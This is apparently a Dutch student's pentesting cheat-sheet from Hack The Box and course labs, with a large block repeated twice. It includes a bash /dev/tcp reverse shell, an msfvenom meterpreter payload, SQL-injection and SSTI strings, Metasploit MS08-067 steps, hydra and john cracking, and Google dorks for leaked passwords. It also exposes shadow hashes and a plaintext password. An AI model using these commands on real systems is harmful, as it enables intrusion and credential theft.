
SCRIPT

script -a htbagile  als klaar is exit slaat alles op     479eef9abcb9d427013ef9e15c5308ff

FTP

bestand van terminal naar ftp zetten  (in terminal) sudo touch best.txt   of echo leon > voetbal.txt  # mv leonkeijzers.txt leonkeijzers.html dit zet leon ook in de web text   (in ftp)  put voetbal.txt

anonymous inloggen  ftp 10.10.10.10 anonymous password luhjgkjhgkjhg moet iets intypen

DIRSEARCH

sudo dirsearch -u [http://10.129.234.29](http://10.129.234.29/)

MSFVENOM

 msfvenom -p windows/meterpreter/reverse_tcp LHOST=10.10.14.7 LPORT=4444 -f aspx > payload.aspx

GOBUSTER

gobuster dir -u [http://10.129.95.234](http://10.129.95.234/)  -w /usr/share/wordlists/dirbuster/directory-list-2.3-medium.txt -x php   php kan ook een andere zijn

sudo gobuster dir -u [http://10.129.239.231/](http://10.129.239.231/) -w /usr/share/seclists/Discovery/Web-Content/raft-small-directories.txt -o initial.crawl -t 20 -x php   

NIKTO

nikto -host [http://unika.htb](http://unika.htb/)

CURL

curl localhost

SSTI COBALT

${{<%[%'"}}%\.'"     laatste haakjes ' en " zelf toegevoegd  -injectie voor inlog

LNVP listener

sudo nc -lvnp 80 0f 44444 of 1965 9001 enz

("bash -c 'bash -i >& /dev/tcp/10.10.14.7/9001 0>&1'");     reverse shell   in de gelukte shell typ                 python3 -c 'import pty;pty.spawn("bin/bash")'  sudo -l voor root mogelijkheden

python3

python3 -c 'import pty;pty.spawn("bin/bash")'

VIM editor

TL;DR – How to Exit Vim

    Press ESC once (sometimes twice)

    Make sure you are using the English input method

    The next step depends on the current status and your expectations:

        If you didn't make any changes, type :q and press Enter/return

        If you made some changes and would like to keep them, type :  w   q    and press Enter/return

        If you made some changes and would rather discard them, type :  q   ! and press Enter/return

    GTFOBins voor alle commando regels !!!!! 

TAR   UNZIP   7z x

tar -zxvf pycharm-community-2023.3.2.tar.gz          maar beter rechts klicken en extract here

PYCHARM

kali㉿kali)-[~/Downloads/pycharm-community-2023.3.2/bin]

└─$  ./pycharm.sh

 ./pycharm.sh  bij ./file eerst een spatie dan ./pycharm.sh

 UNZIP UNTAR

 unzip Access\ Control.zip

7z x Access\ Control.zip

7z l -slt Access\ Control.zip     voor info

WGET

wget -m [ftp://anonymous:anonymous@10.129.240.2](ftp://anonymous:anonymous@10.129.240.2/)

wget -m  --no-passiveftp://anonymous:anonymous@10.129.240.26  

wget [http://10.129.240.26/out.jpg](http://10.129.240.26/out.jpg)

EXIFTOOL

exiftool out.jpg

STRINGS

strings out.jpg    textcode coderen decoderen

strings -n 8 backup.mdb   alles coderen wat niet 8 is

JOHN

zip2john Access\ Control.zip

Access Control.zip/Access Control.pst:

$zip2$*0*3*0*6f1cd9ae3480669b2b61dbb4c0fc7ce3*fef9*299a*7e03b2fdd0eb70b9e76812e1dd7ac7ddcc60da701f91a3683

44796061d688a392b15256fe00fa1db1e383ed05b7ab3051dc56757b7024f7a8d02b4d0e3558e8a29

john -w=/usr/share/wordlists/rockyou.txt hashdecoder

FILE   

file *       

file backup.mdb

SMBCLIENT

smbclient \\\\10.129.239.170\\C$ -U Administrator

HYDRA

hydra -L usernames.txt -p 'funnel123#' ssh//10.129.228.195

NSLOOKUP

nslookup 

set timeout=10  

google.com 

set type=MX

bol.com

set type=ANY

bol.com --fqdn

HOSTNAME

hostnamectl

Server:         192.168.52.2

Address:        192.168.52.2#53

mile2

TCPDUMP

tcpdump is een softwarehulpmiddel (packet sniffer) voor de diagnose en analyse van computernetwerken. Het programma draait op de meeste UNIX(-achtige) systemen, zoals Linux, Solaris, HP-UX, AIX en Mac OS X. Hierbij wordt de netwerkkaart in promiscue modus gezet en wordt gebruikgemaakt van libpcap om pakketjes die in het netwerk worden verzonden af te vangen. Er bestaat ook een Windowsversie onder de naam windump, die op zijn beurt gebruikmaakt van de naar Windows geporteerde versie van libpcap (winpcap).

Het programma werd oorspronkelijk geschreven door Van Jacobson, Craig Leres en Steven McCanne van het Lawrence Berkeley Laboratory van de Universiteit van California.

NCAT

─$ sudo find / -name nc.exe

[sudo] password for kali:

/usr/share/windows-resources/binaries/nc.exe

/usr/share/seclists/Web-Shells/FuzzDB/nc.exe

find: ‘/run/user/1000/doc’: Permission denied

find: ‘/run/user/1000/gvfs’: Permission denied

┌──(kali㉿kali)-[~]

└─$ sudo locate nc.exe     

/usr/share/seclists/Web-Shells/FuzzDB/nc.exe

/usr/share/windows-resources/binaries/nc.exe

NCat – Voorbeelden en Gebruik

NCat is een applicatie die aanwezig moet zijn in de tools library van iedere IT Professional en Security Researcher. NCat is een zeer geavanceerde network utility van het Nmap (security scanner) team. NCat is geschreven als verbeterde opvolger van Netcat. Met Netcat kunnen poorten gescand worden, bestanden getransporteerd worden en Netcat kan zelfs als backdoor fungeren

sudo grep root /etc/passwd

root:x:0:0:root:/root:/usr/bin/zsh

sudo ifup lo  inet 192.168.52.128 schakeld interface in ifdown schakeld inerface uit

lo =loop back

sudo ifconfig ens160 192.168.52.128

sudo dhclient ens160 192.168.52.128

sudo route -n

Kernel IP routing table

Destination     Gateway         Genmask         Flags Metric Ref    Use Iface

0.0.0.0         192.168.52.2    0.0.0.0         UG    100    0        0 eth0

192.168.52.0    0.0.0.0         255.255.255.0   U     100    0        0 eth0

lijst met netwerkroutes

sudo cat /etc/resolv.conf adres domain name server

control c back search (eerste letters typen)

SCRIPT

script -a htbagile  als klaar is exit slaat alles op     479eef9abcb9d427013ef9e15c5308ff

FTP

bestand van terminal naar ftp zetten  (in terminal) sudo touch best.txt   of echo leon > voetbal.txt  # mv leonkeijzers.txt leonkeijzers.html dit zet leon ook in de web text   (in ftp)  put voetbal.txt

anonymous inloggen  ftp 10.10.10.10 anonymous password luhjgkjhgkjhg moet iets intypen

DIRSEARCH

sudo dirsearch -u [http://10.129.234.29](http://10.129.234.29/)

MSFVENOM

 msfvenom -p windows/meterpreter/reverse_tcp LHOST=10.10.14.7 LPORT=4444 -f aspx > payload.aspx

GOBUSTER

gobuster dir -u [http://10.129.95.234](http://10.129.95.234/)  -w /usr/share/wordlists/dirbuster/directory-list-2.3-medium.txt -x php   php kan ook een andere zijn

sudo gobuster dir -u [http://10.129.239.231/](http://10.129.239.231/) -w /usr/share/seclists/Discovery/Web-Content/raft-small-directories.txt -o initial.crawl -t 20 -x php   

NIKTO

nikto -host [http://unika.htb](http://unika.htb/)

CURL

curl localhost

SSTI COBALT

${{<%[%'"}}%\.'"     laatste haakjes ' en " zelf toegevoegd  -injectie voor inlog

LNVP listener

sudo nc -lvnp 80 0f 44444 of 1965 9001 enz

("bash -c 'bash -i >& /dev/tcp/10.10.14.7/9001 0>&1'");     reverse shell   in de gelukte shell typ                 python3 -c 'import pty;pty.spawn("bin/bash")'  sudo -l voor root mogelijkheden

python3

python3 -c 'import pty;pty.spawn("bin/bash")'

VIM editor

TL;DR – How to Exit Vim

    Press ESC once (sometimes twice)

    Make sure you are using the English input method

    The next step depends on the current status and your expectations:

        If you didn't make any changes, type :q and press Enter/return

        If you made some changes and would like to keep them, type :  w   q    and press Enter/return

        If you made some changes and would rather discard them, type :  q   ! and press Enter/return

    GTFOBins voor alle commando regels !!!!! 

TAR   UNZIP   7z x

tar -zxvf pycharm-community-2023.3.2.tar.gz          maar beter rechts klicken en extract here

PYCHARM

kali㉿kali)-[~/Downloads/pycharm-community-2023.3.2/bin]

└─$  ./pycharm.sh

 ./pycharm.sh  bij ./file eerst een spatie dan ./pycharm.sh

 UNZIP UNTAR

 unzip Access\ Control.zip

7z x Access\ Control.zip

7z l -slt Access\ Control.zip     voor info

WGET

wget -m [ftp://anonymous:anonymous@10.129.240.2](ftp://anonymous:anonymous@10.129.240.2/)

wget -m  --no-passiveftp://anonymous:anonymous@10.129.240.26  

wget [http://10.129.240.26/out.jpg](http://10.129.240.26/out.jpg)

EXIFTOOL

exiftool out.jpg

STRINGS

strings out.jpg    textcode coderen decoderen

strings -n 8 backup.mdb   alles coderen wat niet 8 is

JOHN

zip2john Access\ Control.zip

Access Control.zip/Access Control.pst:

$zip2$*0*3*0*6f1cd9ae3480669b2b61dbb4c0fc7ce3*fef9*299a*7e03b2fdd0eb70b9e76812e1dd7ac7ddcc60da701f91a3683

44796061d688a392b15256fe00fa1db1e383ed05b7ab3051dc56757b7024f7a8d02b4d0e3558e8a29

john -w=/usr/share/wordlists/rockyou.txt hashdecoder

FILE   

file *       

file backup.mdb

SMBCLIENT

smbclient \\\\10.129.239.170\\C$ -U Administrator

HYDRA

hydra -L usernames.txt -p 'funnel123#' ssh//10.129.228.195

NSLOOKUP

nslookup 

set timeout=10  

google.com 

set type=MX

bol.com

set type=ANY

bol.com --fqdn

HOSTNAME

hostnamectl

Server:         192.168.52.2

Address:        192.168.52.2#53

mile2

TCPDUMP

tcpdump is een softwarehulpmiddel (packet sniffer) voor de diagnose en analyse van computernetwerken. Het programma draait op de meeste UNIX(-achtige) systemen, zoals Linux, Solaris, HP-UX, AIX en Mac OS X. Hierbij wordt de netwerkkaart in promiscue modus gezet en wordt gebruikgemaakt van libpcap om pakketjes die in het netwerk worden verzonden af te vangen. Er bestaat ook een Windowsversie onder de naam windump, die op zijn beurt gebruikmaakt van de naar Windows geporteerde versie van libpcap (winpcap).

Het programma werd oorspronkelijk geschreven door Van Jacobson, Craig Leres en Steven McCanne van het Lawrence Berkeley Laboratory van de Universiteit van California.

NCAT

─$ sudo find / -name nc.exe

[sudo] password for kali:

/usr/share/windows-resources/binaries/nc.exe

/usr/share/seclists/Web-Shells/FuzzDB/nc.exe

find: ‘/run/user/1000/doc’: Permission denied

find: ‘/run/user/1000/gvfs’: Permission denied

┌──(kali㉿kali)-[~]

└─$ sudo locate nc.exe     

/usr/share/seclists/Web-Shells/FuzzDB/nc.exe

/usr/share/windows-resources/binaries/nc.exe

NCat – Voorbeelden en Gebruik

NCat is een applicatie die aanwezig moet zijn in de tools library van iedere IT Professional en Security Researcher. NCat is een zeer geavanceerde network utility van het Nmap (security scanner) team. NCat is geschreven als verbeterde opvolger van Netcat. Met Netcat kunnen poorten gescand worden, bestanden getransporteerd worden en Netcat kan zelfs als backdoor fungeren

sudo grep root /etc/passwd

root:x:0:0:root:/root:/usr/bin/zsh

sudo ifup lo  inet 192.168.52.128 schakeld interface in ifdown schakeld inerface uit

lo =loop back

sudo ifconfig ens160 192.168.52.128

sudo dhclient ens160 192.168.52.128

sudo route -n

Kernel IP routing table

Destination     Gateway         Genmask         Flags Metric Ref    Use Iface

0.0.0.0         192.168.52.2    0.0.0.0         UG    100    0        0 eth0

192.168.52.0    0.0.0.0         255.255.255.0   U     100    0        0 eth0

lijst met netwerkroutes

sudo cat /etc/resolv.conf adres domain name server

control c back search (eerste letters typen)

sudo nmap -vvv -A scanme.nmap.org -oX nmapop.xml   html scan uitgebrijd

User created with password '435972a4-bec1-47bd-a673-bb53cd975124'.  greenbone  webadres [https://127.0.0.1:9392](https://127.0.0.1:9392/) 

SHERLOCK

ENV

FILE *

CONTROL SHIFT T nieuwe tab

sudo find / -name nc.exe

PUT  nc.exe  copy naar ftp

!ls    kali lijst als ik op een andere pc ben ofzo

ssh@leon192.168.34.34

mount -t sifs 192.169 23.23:setup.exe 

cp of scp setup.exe nc.exe student @192 168 33.212:~   ook copieren

iptables    forwarding

sudo useradd Leon

tail /etc/passwd

Leon:x:1001:1001::/home/Leon:/bin/sh

└─$ head /etc/passwd

su = naar root

$ sudo grep Leon /etc/shadow

Leon:!:19780:0:99999:7:::

sudo passwd Leon                                                        

New password:

Retype new password:

passwd: password updated successfully  NACleon1

sudo grep Leon /etc/shadow

Leon:$y$j9T$1DbnUlCK4NBv8C5bNmQRr1$ePVrIwGaypzKb1oie9OQBfCXWKi9AMhtUeB7X./Zbq0:19780:0:99999:7:::

nano /etc/shadow

root:*:19691:0:99999:7:::

daemon:*:19691:0:99999:7:::

bin:*:19691:0:99999:7:::

sys:*:19691:0:99999:7:::

sync:*:19691:0:99999:7

nano/etc/passwd

owner -group owner-everyone  de 3 rechten

chmod 777  alles naar root

──(root㉿kali)-[/etc]

└─# cat /etc/passwd

root:x:0:0:root:/root:/usr/bin/zsh

daemon:x:1:1:daemon:/usr/sbin:/usr/sbin/nologin

bin:x:2:2:bin:/bin:/usr/sbin/nologin

sys:x:3:3:sys:/dev:/usr/sbin/nologin

sync:x:4:65534:sync:/bin:/bin/sync

games:x:5:60:games:/usr/games:/usr/sbin/nologin

man:x:6:12:man:/var/cache/man:/usr/sbin/nologin

lp:x:7:7:lp:/var/spool/lpd:/usr/sbin/nologin

mail:x:8:8:mail:/var/ma

─# cat /etc/group

root:x:0:

daemon:x:1:

bin:x:2:

sys:x:3:

adm:x:4:kali

tty:x:5:

disk:x:6:

lp:x:7:

mail:x:8:

─# arp-scan scanme.nmap.org

Interface: eth0, type: EN10MB, MAC: 00:0c:29:97:a9:f7, IPv4: 192.168.52.128

Starting arp-scan 1.10.0 with 1 hosts ([https://github.com/royhills/arp-scan](https://github.com/royhills/arp-scan))

1 packets received by filter, 0 packets dropped by kernel

Ending arp-scan 1.10.0: 1 hosts scanned in 2.053 seconds (0.49 hosts/sec). 0 res

cd /usr/share/nmap/scripts |ssh  

usage: ssh [-46AaCfGgKkMNnqsTtVvXxYy] [-B bind_interface] [-b bind_address]

           [-c cipher_spec] [-D [bind_address:]port] [-E log_file]

           [-e escape_char] [-F configfile] [-I pkcs11] [-i identity_file]

           [-J destination] [-L address] [-l login_name] [-m mac_spec]

           [-O ctl_cmd] [-o option] [-P tag] [-p port] [-R address]

           [-S ctl_path] [-W host:port] [-w local_tun[:remote_tun]]

           destination [command [argument ...]]

       ssh [-Q query_o

CHMOD

chmod 777 -R /scripts

enum4linux 192.168.198.42   haalt veel belangrijke info op

smbmap -H 192.168.198.42     ook voor info

snmp-check 192.168.198.42    heel veel info

service --status-all         

 [ - ]  apache-htcacheclean

 [ - ]  apache2

 [ - ]  apparmor

 [ - ]  atftpd

 [ - ]  bluetooth

 [ - ]  console-setup.sh

 [ + ]  cron

 [ - ]  cryptdisks

 [ - ]  cryptdisks-early

 [ + ]  dbus

 [ - ]  dns2tcp

 [ + ]  haveged

 [ - ]  inetsim

 [ - ]  iodined

 [ - ]  ipsec

 [ - ]  keyboard-setup.sh

 [ + ]  kmod

 [ + ]  lightdm

 [ - ]  lm-sensors

 [ - ]  mariadb

 [ - ]  miredo

 [ - ]  mosquitto

 [ + ]  networking  en meer hier staan alle aps

dig all @192.168.170.62  192.168.170.62   ook veel info

┌──(kali㉿kali)-[~]

└─$ dig any @192.168.170.62  192.168.170.62  andere versie

; <<>> DiG 9.19.21-1-Debian <<>> any @192.168.170.62 192.168.170.62

; (1 server found)

;; global options: +cmd

;; Got answer:

;; ->>HEADER<<- opcode: QUERY, status: REFUSED, id: 20518

;; flags: qr rd; QUERY: 1, ANSWER: 0, AUTHORITY: 0, ADDITIONAL: 1

;; WARNING: recursion requested but not available

;; OPT PSEUDOSECTION:

; EDNS: version: 0, flags:; udp: 4096

; COOKIE: cbd16bef5d9a67f02f11a5a866605fbd7322823434013ffe (good)

;; QUESTION SECTION:

;192.168.170.62.                        IN      ANY

;; Query time: 40 msec

;; SERVER: 192.168.170.62#53(192.168.170.62) (TCP)

;; WHEN: Wed Jun 05 08:53:15 EDT 2024

;; MSG SIZE  rcvd: 71

python3 exploit.py -m 192.168.2.131 -c

les 1      vm ware pro licentie vragen bij Novi  control c = stop zoekendirb   laptop 87.211.216.232

eerste testdoel is [http://scanme.nmap.org](http://scanme.nmap.org/)    en dvwa.co.uk

apt search flameshot

sudo apt update wacht woord kali lali

ls = list

cd = chaince directory

tilde  schuine streep naam  is de folder

~/Downloads bv.

cd .. is terug naar home directory(startpunt)

ls -l voor de rechten van de bestanden

ls -al alle directorys (bestanden) ook de verborgen bestanden

.zshrc is de shell

echo $SHELL vragen besturing echo is vragen inhoud $ is variabele

env = alle variabele

cat intypen als je het niet kent d

sudo apt install voor installaties bv flameshot

sudo apt

tcp antwoord udp niet altijd

nmap tool voor scannen poorten

nmap scanme.nmap.org

nmap scant 1000 poorten

dan nmap -sV gebruiken -sS =stelth tegen opsporing

wireshark filteren op website typ http in titelbalk

ingetypt wachtwoord bv op vulnhub.web/ inlog vinden wire shark =hypertext tranfer protocol, HTML Form Encoded:

poort 22 is voor inloggen poort80 is een web pagina

dan  nmap -sV -sC dan -p poortnummers dan doeladres en -F voor snelle scan 100 poorten

poort 80 intressant voor pentesting

dan nikto commando kijk naar headers bv x frame xss enz.

nikto -host [http://scanme.nmap.org](http://scanme.nmap.org/)

kijk dan naar header tcn en mod negotiation is enabled voor bruteforce attack

kijk ook naar outdated files

dan verborgen bestanden zoeken

met dirb commando

dirb [http://scanme.nmap.org](http://scanme.nmap.org/)

.svn directory is intressant sub version

foxi proxi geinstalleerd

firefox-kali tools

zoek naar open ssh bestamden

ip adres bleu  10.129.229.50 nmap

bekende kwetsbaaheden zoeken nmap --script vuln

nuclei geinstalleerd kijk of hij geinstalleerd is ls -l

dan cd go dan ls daar staat bin en pkg dan cd bin weer ls  en er staat nuclei   dan ./nuclei en zie het bestand cd .. om terug te gaan

weer kijken via ls -l en nuclei-templates is bij de directorys -bestanden gekomen

dan cd nuclei-templates/

doe dan een ls -l cd ssl en verken de sub bestanden

doe een less commando op een van die bestanden bv less (bestandsnaam)

nano commando is voor bewerken bv nano .zshrc hier kan je instructies toevoegen

zoals deze  export PATH=$PATH:/home/kali/go/bin

control x voor opslaan

dan typ source .zshrc om bij nuclei te komen kijk even bij nuclei --help voor alle commandos bv nuclei -u [http://scanme.nmap.org](http://scanme.nmap.org/)

ander onderdeel nu het owasp registreert de kwetsbaarheden in websites kijk ook bij invul tabbladen

de owasp top 10 lees deze door voor exploitation te doen

exploit data base

exploit database kijk naar open ssh

kijk voor exploit downloads open ssh

python codes schrijven voor exploit voorbeelden uitijken met uitvoeren! nooit op ijgen computer maar op virtual machine

maak met codes schrijven regelmatig print screens!

je kan downloads direct op je vm zetten ja kan ook searchsploit commando schrijven

commando  searchsploit open ssh   opbekijken

kijk bij user enumeration

directoty aanmaken met mkdir dan bv boxes dan bv blue even nakijken eerst

metasploit starten met msfconsole

nmap -sV dan nmap -Pn dan nmap 192.168.1.109 -sV -Pn dan sudo msfconsole

dan search smb  dan grep scanner search smb dan zoek  dit: auxiliary/scanner/smb/smb_ms17_010

typ use auxiliary/scanner/smb/smb_ms17_010

dan show options dan set RHOSTS 192.168.1.109 dan run en kijk voor vulnerable

1'or'1'='1 dit is een sql injectie voor wachtwoorden

intitle webcam x5  googelen voor camaras

filetype env db_password googelen voor wachtwoorden en google naar (google hacking database)

haching md5 algoritme bv. dunyunlsuygvu3548igiuyngfiugugyn dit is een wachtwoord

sudo hydra voor wachtwoorden

typ cd /usr/share/wordlists dan ls -l zoek rockyou.txt haal deze op via linux button(draak linksboven) dan file manager file system usr/share/wordlists haal het op met de button nmap kijk ook naar andere paswordfiles

typ sudo gzip -d rockyou.txt.gz

 dan wc -l rockyou.txt om te kijken hoeveel wachtwoorden er in staan

 lijst openen met less rockyou.txt

udo hydra voor wachtwoorden

typ cd /usr/share/wordlists dan ls -l zoek rockyou.txt haal deze op via linux button (draak linksboven)file maNager file system usr/share/wordlists haal het op met de button nmap kijk ook naaR andere paswordfiles

 typ sudo gzip -d rockyou.txt.gz

 dan wc -l rockyou.txt om te kijken hoeveel wachtwoorden er in staan

 lijst openen met less rockyou.txt

 netdiscover commando bekijken     clear commando maakt blad leeg

 netdiscover -r 192.168.0.0/24 voor scannen

 hack the box vpn verbinden in terminal typ cd Downloads dan ls -l dan $ sudo openvpn Dedicated_Lab_leonkeijzers.ovpn dan ifconfig

10.129.230.85:445 - =-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=

[+] 10.129.230.85:445 - =-=-=-=-=-=-=-=-=-=-=-=-=-WIN-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=

[+] 10.129.230.85:445 - =-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=

Less is different from the editors above, if you’re inside commands that don’t need input, like “less” or top, you can press “q”.

vpn ip adres van mij zoeken:  ip addr show

[https://www.youtube.com/watch?v=we0cYx37lMo](https://www.youtube.com/watch?v=we0cYx37lMo) blue machine, windows uitleg

nc -lnvp (1234 bv of 4444) poort luisteren

meterpreter commando ps om alle programmas te zien (goeie)

dan peterpreter: migrate dan nummer bv 4020

man nmap en man sudo root voor uitleg

echo ' hier text' voor print dan  echo ' hallo' > test.txt voor opslaan dan cat test.txt om te bekijken dan cp test.txt Downloads om te copieren en rm Downloads/test.txt om te verwijderen ook mv test.txt Downloads om te verplaatsen

locate test.txt  is iets zoeken eerst updaten met sudo updatedb

eerdere commandos zien met pijl naar boven en beneden

passwd om wachtwoord te verranderen

drwxr-xr-x bestanden directory lezen en schrijven kijk waar je toegang hebt bv in tmp folders ls -la /tmp de streepjes betekenen :geen toegang (drwxr-xr-x )r=read w=write x = execute d=directory

rechten verranderen: -rw-r--r--  1 leon leon     7 21 dec 14:26  hallo.txt

doe dan cmod bv chmod +rwx hallo.txt kijk dan bij ls -al en kleur verranderd dus rechten op execute er staat nu : -rwxr-xr-x

chmod 777 hallo.txt voor alle toegang nu staat er -rwxrwxrwx  r=4 punten w=2 en x=1 alles is dan 7 read only bv =444 write only 222 enz

gebruiker toevoegen:sudo adduser keijzers wisselen van gebruiker: su keijzers, kijk voor wachtwoorden dan op:

cat /etc/passwd en scroll naar beneden om te zien welke machene ze draaien en welke shell  welke sshd en mysql alle info

zoek shaddow files voor wachtwoord bashes :cat /etc/shadow

cat: /etc/shadow: Toegang geweigerd

 sudo /etc/shadow

[sudo] wachtwoord voor keijzers:

keijzers is not in the sudoers file.

(keijzers㉿kali)-[/home/leon]  terug switchen

└─$ su leon

Wachtwoord:

┌──(leon㉿kali)-[~]

dan :sudo cat /etc/shadow

[sudo] wachtwoord voor leon:

root:!:19335:0:99999:7:::

daemon:*:19335:0:99999:7:::

bin:*:19335:0:99999:7::: enz  kijk voor hash onderin

leon:$y$j9T$co6aIgMgwxKJyv/r695f10$woy/l.BzXeCKlpQdExT40BeUTQ1D4j9joGFAze3gGl2:19335:0:99999:7:::

keijzers:$y$j9T$BFDak/inq1NQyFsMtJBVL.$qRsRA8SxVY/OpGQwNOOTkCLYwaHRgxuBRgPG1SObp/4:19347:0:99999

op windows zijn dezelfde wachtwoorden ook dezelfde hashes op kali niet

doe: sudo cat /etc/sudoers om te kijken wie welke rechten heeft

grep command:

 grep 'sudo' /etc/group

sudo:x:27:leon

text editor in terminal Nano--bv:nano newfile.txt dan typen

voor hack the box flags kijke bij user en bij root

wachtwoord zetten eert user dat kan zijn admin'# dan typ wat je wilt

nmap --script vuln 10.129.230.229

bleu en dit soort pc s volgorde scannen en exploiten:

nmap 10.129.95.187

nmap -sV -sC -p 80,22,443 10.129.95.187

nmap  --script vuln 10.129.95.187

smb-vuln-ms08-067:

|   VULNERABLE:

|   Microsoft Windows system vulnerable to remote code execution (MS08-067)

cd go cd bin ./nuclei    depricated  ssl bv later verder kijken  scripts staan hier

nuclei -u [http://scanme.nmap.org](http://scanme.nmap.org/)

kijk exploit database v is goed x niet even verkennen bv open ssh 2.3 <7.7-user Enumeration

daar staat een python script niet uitvoeren op ijgen pc! alleen op scan the box

searchsploit    kan ook searchsploit ssh doen

dan cd boxes en cd bv blue =welk doel ik heb mkdir om map te maken

(dan soms searchsploit -m 45939 nummer ligt aan kwetsbaarheid )

dan msfconsole

dan msf6 > search ms08-067     nr is uitslag vuln script

dan kijk bij yes dan use 0 of 1 waar yes staat

show options

msf6 exploit(windows/smb/ms08_067_netapi) > set RHOSTS 10.129.95.187

RHOSTS => 10.129.95.187

msf6 exploit(windows/smb/ms08_067_netapi) > set LHOST 10.10.14.4

bij show options zie dat de waarden ingevuld zijn

dan run of exploit

[https://www.youtube.com/watch?v=CZe-e58HMg0&t=117s](https://www.youtube.com/watch?v=CZe-e58HMg0&t=117s)

smbclient -L\\ 10.10.10.10

smbclient -L\\ 10.10.10.10\\ -U Admin

smbclient -L\\ 10.10.10.10

smbclient \\\\ 10.10.10.10\\ -U Admin\\backups -U Admin   ls -al

cat prod.dtsConfig

tools : nslookup whois dnsrecon

subdomains: google fu, dig, nmap, sublist3r, bluto, crt.sh

fingerprinting: nmap, wppalyzer, whatweb, builtwith, netcat

date breaches: haveibeenpwned, breach-parse, weleakeinfo

bugcrowd.com tablad programs sites om te hacken voor geld

e mail zoeken:hunter.io phonebook.cz  [https://www.voilanorbert.com/](https://www.voilanorbert.com/)

`emailhippo emailchecke r.net   crt.sh  owasp amass

scannen: nmap -T4 -p- -A

-